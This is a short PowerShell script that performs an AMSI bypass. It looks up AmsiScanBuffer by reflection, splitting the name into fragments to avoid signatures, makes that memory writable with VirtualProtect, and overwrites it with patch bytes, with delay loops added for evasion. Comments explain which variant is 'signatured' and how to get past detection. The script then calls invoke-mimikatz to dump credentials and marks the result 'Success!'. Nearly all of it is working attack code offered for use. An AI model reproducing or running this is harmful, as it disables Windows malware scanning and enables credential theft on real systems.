

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}


$a="A"
$b="msiS"
$c="canB"
$d="uffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
$oldProtectionBuffer = 0
100..100000 | %{}
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
100..100000 | %{}
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
100..100000 | %{}
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
100..100000 | %{}
###This is the key part lol 
$marsh = [System.Runtime.InteropServices.Marshal]
$marsh::Copy($buf, 0, $funcAddr, 12)
###########################

#[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
#This is signatured^ Simply putting into a variable then calling makes it work 

invoke-mimikatz 
#Success!
<#Refs:
https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6
https://osintteam.blog/abusing-delegations-in-a-windows-active-directory-environment-part-1-2eaeed0293d0
#>